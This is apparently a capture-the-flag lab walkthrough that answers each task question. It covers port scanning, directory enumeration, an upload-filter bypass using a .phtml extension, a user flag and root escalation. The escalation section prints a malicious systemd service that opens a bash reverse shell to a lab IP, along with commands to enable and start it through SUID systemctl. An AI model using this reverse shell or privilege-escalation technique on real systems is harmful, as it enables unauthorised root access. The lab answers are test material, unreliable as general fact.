# Section 1: Reconnaissance
## 1.
Skip

## 2. Scan the box, how many ports are open?
```
1. 21/tcp   open  ftp         vsftpd 3.0.3
2. 22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
3. 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
4. 445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
5. 3128/tcp open  http-proxy  Squid http proxy 3.5.12
6. 3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```
6

## 3. What version of the squid proxy is running on the machine?
3.5.12

## 6. What is the most likely operating system this machine is running?
Ubuntu

## 7. What port is the web server running on?
3333

# Section 2: Locating directories using GoBuster
## 2.
```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/internal (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
```
/internal/

# Section 3: Compromise the webserver
## 1. Try upload a few file types to the server, what common extension seems to be blocked?
.php

## 3. Sniper attack, what is the allowed extension?
.phtml

## 5. What is the name of the user who manages the webserver?
bill

## 6. What is the user flag?
8bd7992fbe8a6ad22a63361004cfcedb

# Section 4: Privilege Escalation
## 1. On the system, search for all SUID files. What file stands out?
First, search for exploitable files: `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`

Knowing that systemctl is exploitable requires a bit of linux knowledge, but basically it manages
services, many of which require root priliveges. You can take advantage of this by writing a
malicious service.

## Exploitation
### root.service
```
[Unit]
Description=rooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.4.15.69/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

1. Upload root.service to the server (disguised as root.phtml), rename it to root.service
2. Add the service `/bin/systemctl enable /var/www/html/internal/uploads/root.service`
3. Start listener `ncat -lvp 9999`
4. Start the service `/bin/systemctl start root`
5. !@#$% Root access

